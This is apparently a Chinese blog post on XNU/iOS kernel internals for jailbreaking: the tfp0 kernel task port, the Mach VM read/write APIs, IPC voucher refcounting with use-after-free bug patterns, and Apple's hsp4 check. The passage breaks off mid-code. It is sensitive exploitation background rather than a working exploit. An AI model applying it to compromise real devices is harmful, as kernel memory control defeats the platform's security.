<h3 id="内核任务端口"><a href="#内核任务端口" class="headerlink" title="内核任务端口"></a>内核任务端口</h3><p>内核被分配了PID 0，相应的无进程任务被称为内核任务。拥有内核任务的发送权限可以完全控制内核内存，对内核内存进行读写，还可以通过分配内存来注入任意代码（EXP执行原理）。<br>如前所述，调用<code>task_for_pid(0)</code>的古老方法之一是patch对pid&#x3D;0的检查。macOS上不安全内核<code>(#if defined SECURE_KERNEL)</code>也有一个<code>processer_set_tasks()</code> API会将内核任务端口作为第一个参数返回。<br>获得内核任务端口后，以下五个MACH API经常用于与内存进行交互。需要注意的是，要成功执行此函数，调用者必须拥有目标任务的任务端口的发送权限。如果查看函数原型，则第一个参数是目标任务<code>(vm_map_t target_task)</code>。可以将内核任务端口<code>(mach_port_t tfp0)</code>作为第一个参数传递给它。具体的代码在<code>libsyscall/mach/mach_vm.c</code>中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Allocate a region of virtual memory in the target task starting from user specified address*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_allocate</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> *address,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span> size,</span></span><br><span class="line"><span class="params">	<span class="type">int</span> flags</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Deallocate a region of virtual memory in the target task starting from user specified address*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_deallocate</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> address,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span> size</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Read Kernel Memory in the target task at a specified address and transfers it to dynamically allocated memory in the callers address space*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">mach_vm_read</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span>		<span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span>	addr,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span>	size,</span></span><br><span class="line"><span class="params">	<span class="type">pointer_t</span>		*data,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_type_number_t</span>	*data_size)</span> *data_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Copy data from a caller-specified address to the given memory region in the target tasks address space*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_write</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target_task,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> address,</span></span><br><span class="line"><span class="params">	<span class="type">vm_offset_t</span> data,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_type_number_t</span> dataCnt</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Sets the Protection attribute for a given memory range in the target tasks address space*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_protect</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target_task,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> address,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span> size, </span></span><br><span class="line"><span class="params">	<span class="type">boolean_t</span> set_maximum,</span></span><br><span class="line"><span class="params">	<span class="type">svm_prot_t</span> new_protection)</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Mach凭证"><a href="#Mach凭证" class="headerlink" title="Mach凭证"></a>Mach凭证</h3><p>Mach凭证（<code>osfmk/ipc/ipc_voucher.h</code>）在内核中的表示为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IPC Voucher</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 凭证是对特定资源管理器属性值的引用计数的不可变（一旦创建）的索引集</span></span><br><span class="line"><span class="comment"> * (which themselves are reference counted).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_voucher</span> &#123;</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_hash;	<span class="comment">/* checksum hash */</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_sum;		<span class="comment">/* checksum of values */</span></span><br><span class="line">	<span class="type">os_refcnt_t</span>		iv_refs;	<span class="comment">/* reference count */</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_table_size;	<span class="comment">/* size of the voucher table */</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_inline_table[IV_ENTRIES_INLINE];</span><br><span class="line">	<span class="type">iv_entry_t</span>		iv_table;	<span class="comment">/* table of voucher attr entries */</span></span><br><span class="line">	<span class="type">ipc_port_t</span>		iv_port;	<span class="comment">/* port representing the voucher */</span></span><br><span class="line">	<span class="type">queue_chain_t</span>		iv_hash_link;	<span class="comment">/* link on hash chain */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>IPC凭证代表一组任意属性，这些属性可以通过Mach消息中的发送权限在进程之间传递，与此相关的库是<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/libdispatch/libdispatch-1008.220.2/">libdispatch</a>。除<code>iv_refs</code>和<code>iv_port</code>外，其他的字段与管理凭证对象的全局列表和存储凭证所代表的属性有关。</p>
<p>voucher的iv_refs成员表示引用计数，从iOS12开始，<code>iv_refs</code>是32位的引用计数，值范围为1-0x0fffffff，超出此范围的引用计数将导致错误，这是一种新的防止整数溢出的缓解措施。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;refcnt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OS_REFCNT_MAX_COUNT     ((os_ref_count_t)0x0FFFFFFFUL)</span></span><br></pre></td></tr></table></figure>

<p>如下所示，访问超出此范围的任何值都会触发内核panic。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_check_underflow</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, <span class="type">os_ref_count_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(count == <span class="number">0</span>)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: underflow (rc=%p, grp=%s)\n&quot;</span>, rc, ref_grp_name(rc));</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_assert_referenced</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, <span class="type">os_ref_count_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(count == <span class="number">0</span>)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: used unsafely when zero (rc=%p, grp=%s)\n&quot;</span>, rc, ref_grp_name(rc));</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_check_overflow</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, <span class="type">os_ref_count_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(count &gt;= OS_REFCNT_MAX_COUNT)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: overflow (rc=%p, grp=%s)\n&quot;</span>, rc, ref_grp_name(rc));</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>iv_port</code>表示此用户空间的凭证。</p>
<blockquote>
<p>通过调用<code>host_create_mach_voucher()</code>陷阱可以创建Mach凭证，返回代表凭证的端口，但是由于凭证是不可变的，当生成的凭证与已有的凭证完全相同时，就会返回现有凭证的引用，而不是创建一个新的凭证。</p>
</blockquote>
<p>voucher的<code>ipc_voucher_reference</code>和<code>ipc_voucher_release</code>函数仅检查voucher是否不为NULL，然后调用<code>iv_reference</code>和<code>iv_release</code>，最后分别调用<code>os_ref_retain</code>和<code>os_ref_release</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_voucher_reference</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (IPC_VOUCHER_NULL == voucher)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	iv_reference(voucher);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_voucher_release</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (IPC_VOUCHER_NULL != voucher)</span><br><span class="line">		iv_release(voucher);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">iv_reference</span><span class="params">(<span class="type">ipc_voucher_t</span> iv)</span></span><br><span class="line">&#123;</span><br><span class="line">	os_ref_retain(&amp;iv-&gt;iv_refs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">iv_release</span><span class="params">(<span class="type">ipc_voucher_t</span> iv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (os_ref_release(&amp;iv-&gt;iv_refs) == <span class="number">0</span>) &#123;</span><br><span class="line">		iv_dealloc(iv, TRUE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_retain</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">os_ref_count_t</span> old = atomic_fetch_add_explicit(&amp;rc-&gt;ref_count, <span class="number">1</span>, memory_order_relaxed);</span><br><span class="line">	os_ref_check_retain(rc, old);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">	ref_retain_group(rc-&gt;ref_group);</span><br><span class="line">	ref_log_op(rc-&gt;ref_group, (<span class="type">void</span> *)rc, REFLOG_RETAIN);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">os_ref_count_t</span> OS_WARN_RESULT</span><br><span class="line"><span class="title function_">os_ref_release</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> os_ref_release_explicit(rc, memory_order_release, memory_order_acquire);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">os_ref_count_t</span></span><br><span class="line"><span class="title function_">os_ref_release_explicit</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, memory_order release_order, memory_order dealloc_order)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Care not to use &#x27;rc&#x27; after the decrement because it might be deallocated</span></span><br><span class="line"><span class="comment">	 * under us.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">os_refgrp</span> *<span class="title">grp</span> =</span> rc-&gt;ref_group;</span><br><span class="line">	ref_log_op(grp, (<span class="type">void</span> *)rc, REFLOG_RELEASE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">os_ref_count_t</span> val = atomic_fetch_sub_explicit(&amp;rc-&gt;ref_count, <span class="number">1</span>, release_order);</span><br><span class="line">	os_ref_check_underflow(rc, val);</span><br><span class="line">	<span class="keyword">if</span> (__improbable(--val == <span class="number">0</span>)) &#123;</span><br><span class="line">		atomic_load_explicit(&amp;rc-&gt;ref_count, dealloc_order);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">		ref_log_drop(grp, (<span class="type">void</span> *)rc); <span class="comment">/* rc is only used as an identifier */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">	ref_release_group(grp, !val);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>BUILD/obj/EXPORT_HDRS/libkern/os/refcnt.h</code>中可以看到更多信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * os_ref_retain: acquire a reference (increment reference count by 1) atomically.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * os_ref_release: release a reference (decrement reference count) atomically and</span></span><br><span class="line"><span class="comment"> *		return the new count. Memory is synchronized such that the dealloc block</span></span><br><span class="line"><span class="comment"> *		(i.e. code handling the final release() == 0 call) sees up-to-date memory</span></span><br><span class="line"><span class="comment"> *		with respect to all prior release()s on the same refcnt object. This</span></span><br><span class="line"><span class="comment"> *		memory ordering is sufficient for most use cases.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * os_ref_release_relaxed: same as release() but with weaker relaxed memory ordering.</span></span><br><span class="line"><span class="comment"> *		This can be used when the dealloc block is already synchronized with other</span></span><br><span class="line"><span class="comment"> *		accesses to the object (for example, with a lock).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * os_ref_release_live: release a reference that is guaranteed not to be the last one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">os_ref_retain</span><span class="params">(<span class="keyword">struct</span> os_refcnt *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">os_ref_count_t</span> <span class="title function_">os_ref_release_explicit</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc,</span></span><br><span class="line"><span class="params">		memory_order release_order, memory_order dealloc_order)</span> OS_WARN_RESULT;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">os_ref_count_t</span> OS_WARN_RESULT</span><br><span class="line"><span class="title function_">os_ref_release</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> os_ref_release_explicit(rc, memory_order_release, memory_order_acquire);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">os_ref_count_t</span> OS_WARN_RESULT</span><br><span class="line"><span class="title function_">os_ref_release_relaxed</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> os_ref_release_explicit(rc, memory_order_relaxed, memory_order_relaxed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_release_live</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(os_ref_release_explicit(rc,</span><br><span class="line">			memory_order_release, memory_order_relaxed) == <span class="number">0</span>)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: unexpected release of final reference (rc=%p)\n&quot;</span>, rc);</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，可能会出现两种漏洞：</p>
<ul>
<li>以某种方式增加引用计数，从而导致溢出。如前所述，由于存在上限，这实际上是无法利用的。但是仍然可以将引用计数增加到0x0fffffff(7个f)。</li>
<li>将对象的引用计数设置为0，但是仍然有一个指向它的指针。由于引用计数变为0，对象将被释放，因此指向该对象的指针变成了悬空指针。</li>
</ul>
<h3 id="hsp4-Patch"><a href="#hsp4-Patch" class="headerlink" title="hsp4 Patch"></a>hsp4 Patch</h3><p>Apple为防止越狱者获得内核任务而实施的另一项技术是对<code>kernel_task</code>的指针检查。即使获得了内核任务的句柄也无法使用Mach VM调用。检查在<code>ipc_kobject_server()</code>函数的<code>ipc_kmsg_trace_send</code>函数调用处开始，它会调用<code>osfmk/kern/ipc_tt.c</code>中的<code>convert_port_to_task_with_exec_token</code>函数，第31行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	ipc_kobject_server</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Handle a message sent to the kernel.</span></span><br><span class="line"><span class="comment"> *		Generates a reply message.</span></span><br><span class="line"><span class="comment"> *		Version for Untyped IPC.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Nothing locked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">ipc_kmsg_t</span></span><br><span class="line"><span class="title function_">ipc_kobject_server</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_kmsg_t</span>	request,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_option_t</span> __unused option)</span></span><br><span class="line">&#123;</span><br><span class="line">	......</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Find the routine to call, and call it</span></span><br><span class="line"><span class="comment">	 * to perform the kernel function</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ipc_kmsg_trace_send(request, option);</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Check if the port is a task port, if its a task port then</span></span><br><span class="line"><span class="comment">		 * snapshot the task exec token before the mig routine call.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="type">ipc_port_t</span> port = request-&gt;ikm_header-&gt;msgh_remote_port;</span><br><span class="line">		<span class="keyword">if</span> (IP_VALID(port) &amp;&amp; ip_kotype(port) == IKOT_TASK) &#123;</span><br><span class="line">			task = convert_port_to_task_with_exec_token(port, &amp;exec_token);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		(*ptr-&gt;routine)(request-&gt;ikm_header, reply-&gt;ikm_header);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Check if the exec token changed during the mig routine */</span></span><br><span class="line">		<span class="keyword">if</span> (task != TASK_NULL) &#123;</span><br><span class="line">			<span class="keyword">if</span> (exec_token != task-&gt;exec_token) &#123;</span><br><span class="line">				exec_token_changed = TRUE;</span><br><span class="line">			&#125;</span><br><span class="line">			task_deallocate(task);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		kernel_task-&gt;messages_received++;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!ipc_kobject_notify(request-&gt;ikm_header, reply-&gt;ikm_header))&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEVELOPMENT || DEBUG</span></span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">&quot;ipc_kobject_server: bogus kernel message, id=%d\n&quot;</span>,</span><br><span class="line">			request-&gt;ikm_header-&gt;msgh_id);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* DEVELOPMENT || DEBUG */</span></span></span><br><span class="line">		    _MIG_MSGID_INVALID(request-&gt;ikm_header-&gt;msgh_id);</span><br><span class="line"></span><br><span class="line">		    ((<span class="type">mig_reply_error_t</span> *) reply-&gt;ikm_header)-&gt;RetCode</span><br><span class="line">			= MIG_BAD_ID;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		  kernel_task-&gt;messages_received++;</span><br><span class="line">	    &#125;</span><br><span class="line">	    kernel_task-&gt;messages_sent++;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>convert_port_to_task_with_exec_token</code>函数调用<code>task_conversion_eval</code>函数，第27行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	convert_port_to_task_with_exec_token</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Convert from a port to a task and return</span></span><br><span class="line"><span class="comment"> *		the exec token stored in the task.</span></span><br><span class="line"><span class="comment"> *		Doesn&#x27;t consume the port ref; produces a task ref,</span></span><br><span class="line"><span class="comment"> *		which may be null.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Nothing locked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">task_t</span></span><br><span class="line"><span class="title function_">convert_port_to_task_with_exec_token</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_port_t</span>		port,</span></span><br><span class="line"><span class="params">	<span class="type">uint32_t</span>		*exec_token)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span 